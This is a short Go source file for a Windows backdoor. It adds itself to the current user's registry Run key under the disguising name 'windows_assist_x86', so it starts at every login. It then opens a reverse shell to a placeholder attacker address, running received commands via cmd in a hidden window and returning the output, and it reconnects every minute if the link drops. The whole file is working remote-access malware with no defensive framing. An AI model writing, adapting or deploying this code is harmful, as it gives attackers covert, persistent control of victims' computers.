package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
	"time"

	"golang.org/x/sys/windows/registry"
)

func reverse(host string) {
	c, err := net.Dial("tcp", host)
	if err != nil {
		if c != nil {
			c.Close()
		}
		time.Sleep(time.Minute)
		reverse(host)
	}

	bufReader := bufio.NewReader(c)
	for {
		fmt.Fprint(c, "-> ")
		externCmd, err := bufReader.ReadString('\n')
		if err != nil {
			c.Close()
			reverse(host)
		}
		cmd := exec.Command("cmd", "/C", externCmd)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		out, _ := cmd.CombinedOutput()

		c.Write(out)
	}
}

func perm() {
	dir, err := filepath.Abs(filepath.Dir(os.Args[0]))
	if err != nil {
		perm()
	}

	key, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.QUERY_VALUE|registry.SET_VALUE)
	if err != nil {
		perm()
	}

	if err = key.SetStringValue("windows_assist_x86", filepath.Join(dir, os.Args[0])); err != nil {
		perm()
	}

	if err = key.Close(); err != nil {
		perm()
	}
}

func main() {
	perm()
	reverse("here.comes.your.ip:1234")
}
